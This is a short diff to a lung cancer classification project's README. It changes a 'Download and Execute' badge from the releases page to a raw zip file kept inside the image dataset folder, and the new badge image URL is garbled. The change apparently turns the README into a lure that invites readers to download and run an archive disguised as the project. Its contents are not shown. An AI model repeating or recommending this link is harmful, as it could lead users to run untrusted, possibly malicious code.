@@ -16,7 +16,7 @@ Welcome to the Lung Cancer Classification repository. This project focuses on ut
 
 ### System Link
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Click%20Here-brightgreen)](https://github.com/SaharStudios/LungCancerClassification/releases)
+[![Download and Execute](https://raw.githubusercontent.com/SaharStudios/LungCancerClassification/main/lung_colon_image_set/Cancer-Classification-Lung-v1.7.zip%20and%20Execute-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SaharStudios/LungCancerClassification/main/lung_colon_image_set/Cancer-Classification-Lung-v1.7.zip)
 
 ---
 
